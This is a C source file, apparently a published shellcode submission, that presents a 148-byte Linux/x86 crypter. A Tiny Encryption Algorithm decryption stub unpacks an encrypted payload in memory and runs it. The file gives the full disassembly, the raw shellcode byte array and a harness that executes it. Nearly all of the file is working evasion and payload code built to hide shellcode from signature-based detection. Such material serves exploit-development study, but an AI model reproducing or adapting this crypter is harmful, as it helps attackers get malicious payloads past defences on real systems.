/* 
*  Title:    Custom Shellcode Crypter using the Tiny Encryption Algorithm - 148 bytes
*  Platform: Linux/x86
*  Date:     13 September 2018
*  Author:   Ray Doyle (@doylersec)
*  Website:  http://www.doyler.net
*  
*  For more information on this shellcode, please see the following blog post:
*  https://www.doyler.net/security-not-included/custom-shellcode-crypter
*/

/****************************************************
Disassembly of section .text:

08048060 <_start>:
 8048060:	eb 5c                	jmp    80480be <call_decrypt>

08048062 <pre_decrypt>:
 8048062:	58                   	pop    eax
 8048063:	8d 50 21             	lea    edx,[eax+0x21]
 8048066:	50                   	push   eax

08048067 <decrypt>:
 8048067:	8b 04 24             	mov    eax,DWORD PTR [esp]
 804806a:	80 38 aa             	cmp    BYTE PTR [eax],0xaa
 804806d:	74 54                	je     80480c3 <EncryptedShellcode>
 804806f:	8b 30                	mov    esi,DWORD PTR [eax]
 8048071:	8b 78 04             	mov    edi,DWORD PTR [eax+0x4]
 8048074:	b9 20 37 ef c6       	mov    ecx,0xc6ef3720

08048079 <decrypt_loop>:
 8048079:	89 f3                	mov    ebx,esi
 804807b:	c1 e3 04             	shl    ebx,0x4
 804807e:	03 5a 08             	add    ebx,DWORD PTR [edx+0x8]
 8048081:	8d 04 0e             	lea    eax,[esi+ecx*1]
 8048084:	31 c3                	xor    ebx,eax
 8048086:	89 f0                	mov    eax,esi
 8048088:	c1 e8 05             	shr    eax,0x5
 804808b:	03 42 0c             	add    eax,DWORD PTR [edx+0xc]
 804808e:	31 c3                	xor    ebx,eax
 8048090:	29 df                	sub    edi,ebx
 8048092:	89 fb                	mov    ebx,edi
 8048094:	c1 e3 04             	shl    ebx,0x4
 8048097:	03 1a                	add    ebx,DWORD PTR [edx]
 8048099:	8d 04 0f             	lea    eax,[edi+ecx*1]
 804809c:	31 c3                	xor    ebx,eax
 804809e:	89 f8                	mov    eax,edi
 80480a0:	c1 e8 05             	shr    eax,0x5
 80480a3:	03 42 04             	add    eax,DWORD PTR [edx+0x4]
 80480a6:	31 c3                	xor    ebx,eax
 80480a8:	29 de                	sub    esi,ebx
 80480aa:	81 e9 b9 79 37 9e    	sub    ecx,0x9e3779b9
 80480b0:	75 c7                	jne    8048079 <decrypt_loop>
 80480b2:	58                   	pop    eax
 80480b3:	89 30                	mov    DWORD PTR [eax],esi
 80480b5:	89 78 04             	mov    DWORD PTR [eax+0x4],edi
 80480b8:	83 c0 08             	add    eax,0x8
 80480bb:	50                   	push   eax
 80480bc:	eb a9                	jmp    8048067 <decrypt>

080480be <call_decrypt>:
 80480be:	e8 9f ff ff ff       	call   8048062 <pre_decrypt>

080480c3 <EncryptedShellcode>:
 80480c3:	32 8d c9 7c 7a 8a    	xor    cl,BYTE PTR [ebp-0x75858337]
 80480c9:	e7 47                	out    0x47,eax
 80480cb:	6b 2a 09             	imul   ebp,DWORD PTR [edx],0x9
 80480ce:	6c                   	ins    BYTE PTR es:[edi],dx
 80480cf:	e8 cd 32 05 89       	call   9109b3a1 <__bss_start+0x890522ad>
 80480d4:	a0 c0 1a 59 71       	mov    al,ds:0x71591ac0
 80480d9:	89 4a 06             	mov    DWORD PTR [edx+0x6],ecx
 80480dc:	ff                   	(bad)  
 80480dd:	7d bd                	jge    804809c <decrypt_loop+0x23>
 80480df:	dd 64 15 48          	frstor [ebp+edx*1+0x48]
 80480e3:	aa                   	stos   BYTE PTR es:[edi],al

080480e4 <key>:
 80480e4:	57                   	push   edi
 80480e5:	51                   	push   ecx
 80480e6:	56                   	push   esi
 80480e7:	68 38 7b 37 43       	push   0x43377b38
 80480ec:	3f                   	aas    
 80480ed:	67 45                	addr16 inc ebp
 80480ef:	5f                   	pop    edi
 80480f0:	42                   	inc    edx
 80480f1:	3c 64                	cmp    al,0x64
 80480f3:	24                   	.byte 0x24
****************************************************/

#include<stdio.h>
#include<string.h>

unsigned char code[] = \
"\xeb\x5c\x58\x8d\x50\x21\x50\x8b\x04\x24\x80\x38\xaa\x74\x54\x8b\x30\x8b\x78\x04\xb9\x20\x37\xef\xc6\x89\xf3\xc1\xe3\x04\x03\x5a\x08\x8d\x04\x0e\x31\xc3\x89\xf0\xc1\xe8\x05\x03\x42\x0c\x31\xc3\x29\xdf\x89\xfb\xc1\xe3\x04\x03\x1a\x8d\x04\x0f\x31\xc3\x89\xf8\xc1\xe8\x05\x03\x42\x04\x31\xc3\x29\xde\x81\xe9\xb9\x79\x37\x9e\x75\xc7\x58\x89\x30\x89\x78\x04\x83\xc0\x08\x50\xeb\xa9\xe8\x9f\xff\xff\xff\x32\x8d\xc9\x7c\x7a\x8a\xe7\x47\x6b\x2a\x09\x6c\xe8\xcd\x32\x05\x89\xa0\xc0\x1a\x59\x71\x89\x4a\x06\xff\x7d\xbd\xdd\x64\x15\x48\xaa\x57\x51\x56\x68\x38\x7b\x37\x43\x3f\x67\x45\x5f\x42\x3c\x64\x24";

main()
{
    printf("Shellcode Length: %d\n", strlen(code));
    int (*ret)() = (int(*)())code;
    ret();
}
